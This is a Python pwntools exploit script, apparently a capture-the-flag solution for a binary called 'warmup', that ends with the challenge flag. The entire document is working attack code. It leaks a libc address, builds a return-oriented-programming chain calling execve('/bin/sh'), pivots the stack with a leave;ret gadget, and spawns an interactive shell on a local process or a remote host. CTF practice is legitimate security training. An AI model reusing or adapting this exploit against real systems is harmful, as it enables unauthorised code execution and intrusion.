from pwn import *
# fill in binary name
elf = context.binary = ELF("./warmup")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

if args.REMOTE:
  # fill in remote address
  p = remote("172.210.129.230", 1338)
else:
  p = process([ld.path, elf.path], env = {"LD_PRELOAD": libc.path})


puts_addr = p.recvline()[:-1]
print(f"x: {puts_addr}")
puts_addr = int(puts_addr.decode(), 16)
print(f"puts_addr: {hex(puts_addr)}")

libc.address = puts_addr - libc.sym['puts']              # Set base address
print(f"libc addr: {hex(libc.address)}")

system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location
mprotect = libc.sym['mprotect']
execve = libc.sym['execve']
# TODO: Check if the libc offsets are the same for the given binary
POP_RDI =  libc.address + 0x10f75b
POP_RSI = libc.address + 0x110a4d
XOR_EDX_EDX = libc.address + 0x000000000016e953 # xor edx, edx ; mov rax, rdx ; ret

POP_RBP = 0x40116d 
RET = 0x40118f
LEAVE_RET = 0x401280

payload1 = p64(0) 
payload1 += p64(POP_RDI)
payload1 += p64(binsh)
# payload1 += p64(RET)
payload1 += p64(POP_RSI)
payload1 += p64(0)
payload1 += p64(XOR_EDX_EDX)
payload1 += p64(execve)

p.sendlineafter(b">> ", payload1)

payload2 = 64 * b'a'
payload2 += p64(0x404060)
# we can only insert two instructions max
payload2 += p64(LEAVE_RET)

# pause()
p.sendlineafter(b">> ", payload2)
p.interactive()
# AKASEC{1_Me44444N_J00_C0ULDve_ju57_574CK_p1V07ed}